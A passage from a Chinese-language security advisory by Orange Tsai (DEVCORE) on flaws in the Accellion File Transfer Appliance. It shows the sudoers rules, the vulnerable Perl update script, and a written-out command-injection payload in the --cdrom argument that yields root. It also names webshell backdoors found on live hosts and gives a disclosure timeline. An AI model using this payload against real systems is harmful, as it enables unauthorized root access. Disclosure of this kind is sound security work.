Warning: Permanently added <span class="s1">&#39;0,0.0.0.0&#39;</span> <span class="o">(</span>RSA<span class="o">)</span> to the list of known hosts.
<span class="nv">uid</span><span class="o">=</span>520<span class="o">(</span>soggycat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span></code></pre></div>

<p><br /></p>

<h5 id="2-command-injection-in-yum-clientpl">2. Command Injection in “yum-client.pl”</h5>

<p>在 FTA 中，為了使系統可以直接透過網頁介面進行更新，因此在 sudoers 配置中特別針對 nobody 用戶允許直接使用 root 權限執行指令，並透過 <code class="highlighter-rouge">yum-client.pl</code> 這隻程式進行軟體更新</p>

<div class="highlight-name">/etc/sudoers</div>

<div class="highlight"><pre><code class="language-apache" data-lang="apache">...
<span class="nb">Cmnd_Alias</span>      YUM_UPGRADE = <span class="sx">/usr/bin/yum</span> -y upgrade
<span class="nb">Cmnd_Alias</span>      YUM_CLIENT = <span class="sx">/usr/local/bin/yum-client.pl</span>
...
<span class="c"># User privilege specification</span>
<span class="nb">root</span>     <span class="k">ALL</span>=(ALL) <span class="k">ALL</span>
<span class="nb">admin</span>    <span class="k">ALL</span> =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
<span class="nb">nobody</span>   <span class="k">ALL</span> =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
<span class="nb">soggycat</span> <span class="k">ALL</span> =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
<span class="nb">radmin</span>   <span class="k">ALL</span> =NOPASSWD: RESET_APPL
...</code></pre></div>

<p><br /></p>

<p>其中 YUM_CLIENT 就是進行更新的指令，部分代碼如下：</p>

<div class="highlight-name">/usr/local/bin/yum-client.pl</div>

<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="o">...</span>
<span class="n">GetOptions</span> <span class="p">(</span>
   <span class="s">&#39;help&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$help</span><span class="p">,</span>
   <span class="s">&#39;download_only&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$download_only</span><span class="p">,</span>
   <span class="s">&#39;list&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$list</span><span class="p">,</span>
   <span class="s">&#39;cache&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$cache</span><span class="p">,</span>
   <span class="s">&#39;clearcache&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$clearcache</span><span class="p">,</span>
   <span class="s">&#39;cdrom=s&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$cdrom</span><span class="p">,</span>
   <span class="s">&#39;appid=s&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$appid</span><span class="p">,</span>
   <span class="s">&#39;servername=s&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$servername</span><span class="p">,</span>
   <span class="s">&#39;version=s&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$version</span><span class="p">,</span>
   <span class="s">&#39;token=s&#39;</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$token</span><span class="p">);</span>

<span class="k">my</span> <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="s">&quot;/usr/bin/yum&quot;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$cache</span><span class="p">){</span>
  <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="s">&quot;$YUM_CMD -C&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1"># if this is based on RHEL 5, change the repository</span>
<span class="k">my</span> <span class="nv">$OS</span> <span class="o">=</span> <span class="sb">`grep -q 5 /etc/redhat-release &amp;&amp; echo -n 5`</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$LOGFILE</span> <span class="o">=</span> <span class="s">&quot;/home/seos/log/yum-client.log&quot;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$STATUSFILE</span> <span class="o">=</span> <span class="s">&quot;/home/seos/log/yum-client.status&quot;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$YUMCONFIG</span> <span class="o">=</span> <span class="s">&quot;/etc/yum.conf&quot;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$YUMDIFF_FILE</span> <span class="o">=</span> <span class="s">&#39;/home/seos/log/yum.diff&#39;</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$cdrom</span><span class="p">){</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$OS</span> <span class="ow">eq</span> <span class="s">&quot;5&quot;</span><span class="p">){</span>
     <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="s">&quot;$YUM_CMD -c $cdrom_path/yum.conf-5&quot;</span><span class="p">;</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
     <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="s">&quot;$YUM_CMD -c $cdrom_path/yum.conf&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nb">system</span><span class="p">(</span><span class="s">&quot;mkdir -p /mnt/cdrom &amp;&amp; mount -o loop $cdrom $cdrom_path&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">fdielog</span><span class="p">(</span><span class="nv">$LOGFILE</span><span class="p">,</span><span class="s">&quot;unable to mount: $!&quot;</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>

<p>深入觀察 <code class="highlighter-rouge">yum-client.pl</code> 後可發現在 <code class="highlighter-rouge">--cdrom</code> 參數上存在 Command Injection，使得攻擊者可將任意指令插入參數內並以 root 身分執行</p>

<p>所以使用如下指令：</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bash-3.2<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>

bash-3.2<span class="nv">$ </span>sudo /usr/local/bin/yum-client.pl --cdrom<span class="o">=</span><span class="s1">&#39;$(id &gt; /tmp/.gg)&#39;</span>
mount: can<span class="err">&#39;</span>t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.


bash-3.2<span class="nv">$ </span>cat /tmp/.gg
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>bin<span class="o">)</span>,2<span class="o">(</span>daemon<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span></code></pre></div>

<p>即可以 root 身分執行任意指令！<br />
<br /></p>

<h3 id="後門">後門</h3>
<p><br /><br />
在取得最高權限後，開始對伺服器進行一些審視時，發現已有幾款後門藏在 FTA 主機中了，經過研究後首先確認一款 IRC BOT 為 Niara 所發布的 <a href="http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf">弱點報告</a> 中有提及，此外，額外發現兩款不同類型的 PHP Webshell 並無在公開的報告中發現，透過 Apache Log 時間推測應該是透過 2015 年中的 CVE-2015-2857 所放置之後門。</p>

<p>PHPSPY 後門，全球 1217 台存活主機上共發現 62 台，放置路徑於：</p>

<blockquote>
  <p>https://&lt;fta&gt;/courier/themes/templates/Redirector_Cache.php</p>
</blockquote>

<p>WSO 後門，全球 1217 台存活主機上共發現 9 台，放置路徑於：</p>

<blockquote>
  <p>https://&lt;fta&gt;/courier/themes/templates/imag.php</p>
</blockquote>

<p><br /></p>

<h3 id="致謝">致謝</h3>
<p><br /><br />
這份 Advisory 所提及的弱點為在 2016 二月時參加 Facebook Bug Bounty 時尋找到的，詳情可參考文章《<a href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/">滲透 Facebook 的思路與發現</a>》，找到弱點的當下立即回報包括 Accellion 及 Facebook，Accellion 並在 2/12 號將此份弱點記錄在 FTA_9_12_40 並通知所有受影響的客戶安裝修補程式。</p>

<p>感謝 Facebook 以及 Accellion 的迅速反應跟配合 : )<br />
<br /></p>

<h3 id="timeline">Timeline</h3>

<ul>
  <li>2016/02/06 05:21 聯絡 Accellion 詢問何處可回報弱點</li>
  <li>2016/02/07 12:35 將報告寄至 Accellion Support Team</li>
  <li>2016/03/03 03:03 Accellion Support Team 通知會在 FTA_9_12_40  修復</li>
  <li>2016/05/10 15:18 詢問將撰寫 Advisory 許可及通知發現兩款後門存在</li>
  <li>2016/06/06 10:20 雙方討論定稿</li>
</ul>

<h3 id="參考">參考</h3>
<ul>
  <li><a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857">R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)</a> <a name="ref1"></a></li>
  <li><a href="https://www.rapid7.com/resources/advisories/R7-0039.jsp">Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities</a> <a name="ref2"></a></li>
  <li><a href="http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf">Threat Advisory: Accellion File Transfer Appliance Vulnerability</a> <a name="ref3"></a></li>
</ul>


              </article>
              <p class="sns-widgets">
                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
              </p>
          
              <div class="heading--side-lined">
                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/blog/author/orange" class="blog-author-name">Orange Tsai</a> 
              </div>
              <p class="blog-author-info">
                I am Orange : )
              </p>
          
              <div class="heading--side-lined">
                讀者留言
              </div>
              <div class="blog-comments">
                


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




              </div>
            </div>
          </div>






</main>
      <div class="container--wrapper">

        <div class="relative-posts">
          <div class="heading--side-lined container">
            最新消息
          </div>
          <div class="relative-posts__cells">
  
            <section class="card">
              <a href="/blog/2019/07/23/devcore-201907-recruit/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20150819/devcore_office_1.jpg)"></div>
                <h3 class="card__title">
                  DEVCORE 徵求行政專員
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/公告/" class="card__tag">公告</a><a href="/blog/tag/徵才/" class="card__tag">徵才</a>
              </div>
              <small class="card__category"><a href="/blog/category/最新消息/">最新消息</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20190717/cover.png)"></div>
                <h3 class="card__title">
                  Palo Alto GlobalProtect 資安通報
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/Advisory/" class="card__tag">Advisory</a><a href="/blog/tag/VPN/" class="card__tag">VPN</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a>
              </div>
              <small class="card__category"><a href="/blog/category/資安新聞/">資安新聞</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20190621/cover.png)"></div>
                <h3 class="card__title">
                  破密行動: 以不尋常的角度破解 IDA Pro 偽隨機數
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/Advisory/" class="card__tag">Advisory</a>
              </div>
              <small class="card__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
            </section>
  
          </div>
        </div>


        <div class="contact-section container">
          <h2 class="contact-section__title">
            用最真實的攻擊，驗證企業的防禦
          </h2>
          <a href="/contact/" class="home-contact__button button--dense">聯絡我們</a>
        </div>

        <footer class="main-footer">
          <div class="main-footer__about">
            戴夫寇爾提供<br class="mobile-only" /><a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務<br />在<a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a>或<a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>上追蹤我們的<a href="/blog/" class="link">最新訊息</a><br />瞭解更多戴夫寇爾的<a href="/about/" class="link">駭客思維</a>
          </div>
          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://plus.google.com/118439315679478709768/posts" class="main-footer__sns">
                <svg class="icon-googleplus icon"><use xlink:href="#icon-googleplus" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
          </div>
          <address class="main-footer__address">
            <ul class="list--unstyled">
              <li>
                地址 10487 台北市中山區復興北路 168 號 10 樓
              </li>
              <li>
                Email contact@devco.re
              </li>
              <li>
                電話 02-2718-0156
              </li>
              <li>
                統編 53955237
              </li>
            </ul>
          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2019 DEVCORE 戴夫寇爾</small>
        </footer>
      </div>
    </div>
    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>



  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>





  </body>
</html>




